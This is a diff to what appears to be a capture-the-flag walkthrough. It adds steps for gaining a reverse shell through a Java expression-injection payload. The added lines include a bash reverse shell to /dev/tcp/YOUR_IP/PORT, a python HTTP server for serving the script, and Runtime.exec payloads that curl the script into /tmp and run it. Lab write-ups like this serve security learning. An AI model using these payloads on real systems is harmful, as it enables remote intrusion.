@@ -35,10 +35,27 @@ uploading our reverse shell script.
 ![Screenshot_2022-11-20_15_46_11](https://user-images.githubusercontent.com/99975622/205445066-872fe492-1a70-4280-8216-943e0b4a325f.png)
 
 I had some issues with getting the reverse shell using a one liner, so  we can upload a file and save it in the tmp directory then run bash directly on the file...
+
+##### Code to put in the shell.sh file
 ```
-*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl 10.10.14.99:1000/shell.sh --output /tmp/test.sh ")}
+#!/bin/bash
+/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'
+```
+Open a httpserver via python ....
+```
+python -m http.server 8000
+```
+Then upload your shell script....
+
+```
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl YOUR_IP:8000/shell.sh --output /tmp/test.sh ")}
 ```
 Getting our reverse shell...
+<br> Make sure to set your listener.... 
+```
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("bash /tmp/shell.sh")}
+```
+and boom! 
 
 
 
